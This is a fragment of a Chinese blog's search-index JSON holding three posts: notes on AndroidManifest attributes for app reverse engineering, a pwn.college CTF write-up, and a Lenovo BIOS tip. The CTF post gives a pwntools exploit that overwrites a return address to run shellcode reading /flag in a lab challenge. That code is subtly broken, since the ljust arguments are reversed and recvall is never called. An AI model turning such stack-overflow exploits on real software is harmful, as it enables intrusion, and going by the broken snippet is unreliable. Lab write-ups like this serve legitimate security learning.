aria-hidden=\"true\">逆向流程</figcaption>\r\n</figure>\r\n<blockquote>\r\n<p>需要汉化的字符串基本上都是在arsc中，可以一键汉化，再部分润色。</p>\r\n</blockquote>\r\n<h2 id=\"androidmainfest.xml\">AndroidMainfest.xml</h2>\r\n<p><code>AndroidMainfest.xml</code>是整个应用的描述文件，定义了四大组件信息（Activity、Service、Context\r\nprovider，Broadcaster）</p>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 37%\">\r\n<col style=\"width: 62%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>属性</th>\r\n<th>描述</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>versionCode</td>\r\n<td>版本号，主要用来更新，例如:12</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>versionName</td>\r\n<td>版本名，给用户看的，例如:1.2</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>package</td>\r\n<td>包名，例如：com.zj.52pj.demo</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>uses-permission android:name=\"\"</td>\r\n<td>应用权限，例如：android.permission.INTERNET 代表网络权限</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>android:label=\"<span class=\"citation\" data-cites=\"string/app_name\">@string/app_name</span>\"</td>\r\n<td>应用名称</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>android:icon=\"<span class=\"citation\" data-cites=\"mipmap/ic_launcher\">@mipmap/ic_launcher</span>\"</td>\r\n<td>应用图标路径</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>android:debuggable=\"true\"</td>\r\n<td>应用是否开启debug权限</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<blockquote>\r\n<p>此文参考了吾爱破解论坛正己大佬的<a href=\"https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1695796\">文章</a></p>\r\n</blockquote>\r\n","categories":["Security"],"tags":["Android"]},{"title":"CSE494 S2023 Program Exploitation","url":"/2023/09/17/CSE494-S2023_program-exploitation/","content":"<p>很久没写blog了，这怕是下半年来第一次提笔写起，就用这次的blog来记录下<strong>pwn.college</strong>网站的<em>CSE494-S2023</em>中<code>program exploitation</code>的解题过程吧</p>\r\n<h2 id=\"x01-level1-5\">0x01 level1-5</h2>\r\n<p>level1特别简单，程序中直接输出了input\r\nbuf地址，因此仅需要将显示flag的exp写入到输入地址处，然后将<code>challenge</code>函数返回地址覆盖为<strong>input\r\nbuf</strong>地址即可。构造exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;/challenge/toddlerone_level1.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;The input buffer begins at &#x27;</span>)</span><br><span class=\"line\">input_addr = <span class=\"built_in\">int</span>(p.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&#x27;Payload size: &#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"number\">0x80</span>).encode())</span><br><span class=\"line\"></span><br><span class=\"line\">exp = asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>))</span><br><span class=\"line\">exp = exp.ljust(<span class=\"string\">b&#x27;\\x00&#x27;</span>, <span class=\"number\">0x70</span>)</span><br><span class=\"line\">exp += <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">8</span> <span class=\"comment\"># fake rbp</span></span><br><span class=\"line\">exp += p64(input_addr)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&#x27;Send your payload &#x27;</span>, exp)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvall)</span><br></pre></td></tr></table></figure>\r\n","categories":["CTF"],"tags":["pwn"]},{"title":"电脑知识","url":"/2023/05/11/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/","content":"<p>联想台式开机遇到<code>security password retry count exceeded</code>错误，估计BIOS出错了，按F1进入BIOS设置，然后按F9恢复默认设置，F10保存并退出，重启电脑就好了。</p>\r\n","categories":["Life"],"tags":["Computer"]}]